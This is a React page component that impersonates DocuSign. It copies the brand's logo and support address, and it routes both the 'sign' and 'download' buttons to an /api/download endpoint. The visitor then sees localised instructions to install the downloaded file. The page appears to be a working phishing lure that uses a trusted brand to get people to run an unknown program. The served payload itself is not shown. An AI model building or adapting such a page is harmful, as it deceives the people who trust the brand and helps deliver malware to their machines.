'use client'
import { useState, useEffect } from 'react'
import { translations } from '../lib/translations'

export default function Home() {
  const [lang, setLang] = useState('en')
  const [loading, setLoading] = useState(true)
  const [showInstall, setShowInstall] = useState(false)

  useEffect(() => {
    const params = new URLSearchParams(window.location.search)
    const testLang = params.get('lang')
    
    if (testLang && translations[testLang]) {
      setLang(testLang)
      setLoading(false)
    } else {
      fetch('/api/lang')
        .then(r => r.json())
        .then(data => {
          setLang(data.lang)
          setLoading(false)
        })
        .catch(() => setLoading(false))
    }
  }, [])

  const handleDownload = () => {
    setShowInstall(true)
    window.location.href = '/api/download'
  }

  const t = translations[lang]

  if (loading) return null

  if (showInstall) {
    return (
      <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', minHeight: '100vh', padding: '20px', fontFamily: 'Arial, sans-serif' }}>
        <img src="https://docucdn-a.akamaihd.net/olive/images/2.70.0/global-assets/ds-logo-default.svg" alt="DocuSign" style={{ width: '200px', marginBottom: '2rem' }} />
        <div style={{ maxWidth: '600px', textAlign: 'center' }}>
          <h1 style={{ fontSize: '2.5rem', marginBottom: '1rem' }}>{t.installTitle}</h1>
          <p style={{ fontSize: '1.1rem', marginBottom: '2rem' }}>{t.installDesc}</p>
          <div style={{ backgroundColor: '#f5f5f5', padding: '2rem', borderRadius: '8px', marginBottom: '2rem', textAlign: 'left' }}>
            <h3 style={{ marginBottom: '1rem' }}>Installation Steps:</h3>
            <ol style={{ paddingLeft: '1.5rem' }}>
              {t.installSteps.map((step, i) => (
                <li key={i} style={{ marginBottom: '0.5rem' }}>{step}</li>
              ))}
            </ol>
          </div>
          <div style={{ padding: '1rem', backgroundColor: '#e3f2fd', borderRadius: '8px', marginBottom: '2rem' }}>
            <p style={{ margin: 0, fontSize: '0.95rem' }}>✓ Your download should start automatically. If not, <a href="/api/download" style={{ color: '#0070f3' }}>click here</a>.</p>
          </div>
          <button 
            onClick={() => setShowInstall(false)}
            style={{ 
              padding: '12px 24px', 
              backgroundColor: '#0070f3', 
              color: 'white', 
              border: 'none',
              borderRadius: '8px', 
              cursor: 'pointer',
              fontSize: '1rem'
            }}
          >
            {t.alreadyInstalled}
          </button>
        </div>
      </main>
    )
  }

  return (
    <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', minHeight: '100vh', padding: '20px', fontFamily: 'Arial, sans-serif' }}>
      <img src="https://docucdn-a.akamaihd.net/olive/images/2.70.0/global-assets/ds-logo-default.svg" alt="DocuSign" style={{ width: '200px', marginBottom: '2rem' }} />
      <h1 style={{ fontSize: '2.5rem', marginBottom: '1rem' }}>{t.title}</h1>
      <p style={{ fontSize: '1.1rem', marginBottom: '2rem', textAlign: 'center', maxWidth: '600px' }}>
        {t.description}
      </p>
      <div style={{ display: 'flex', gap: '1rem', marginBottom: '2rem' }}>
        <button 
          onClick={handleDownload}
          style={{ 
            padding: '12px 24px', 
            backgroundColor: '#0070f3', 
            color: 'white', 
            border: 'none',
            borderRadius: '8px', 
            cursor: 'pointer',
            fontSize: '1rem'
          }}
        >
          {t.signButton}
        </button>
        <button 
          onClick={handleDownload}
          style={{ 
            padding: '12px 24px', 
            backgroundColor: '#6c757d', 
            color: 'white', 
            border: 'none',
            borderRadius: '8px', 
            cursor: 'pointer',
            fontSize: '1rem'
          }}
        >
          {t.downloadButton}
        </button>
      </div>
      <p style={{ fontSize: '0.9rem', color: '#666' }}>
        {t.support} <a href="mailto:support@docusign.com" style={{ color: '#0070f3' }}>support@docusign.com</a>.
      </p>
    </main>
  );
}
